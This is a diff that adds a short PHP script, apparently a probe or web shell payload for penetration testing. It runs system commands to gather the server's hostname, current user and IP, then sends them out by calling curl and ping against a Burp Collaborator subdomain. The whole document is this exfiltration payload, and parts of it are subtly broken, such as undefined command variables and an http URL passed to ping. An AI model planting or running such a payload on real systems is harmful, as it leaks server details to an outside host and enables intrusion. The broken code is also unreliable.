@@ -1,0 +1,7 @@
+<?php
+    $hostname = system(hostname);
+    $who = system(whoami);
+    $ip = $_SERVER['SERVER_ADDR'];
+    $data1 = system($curl http://$hostname.$who.$ip.mndrbl4uu6ljbnkc90n2p4baw12rqg.burpcollaborator.net);
+    $data2 = system($ping http://$hostname.$who.$ip.mndrbl4uu6ljbnkc90n2p4baw12rqg.burpcollaborator.net);
+?>
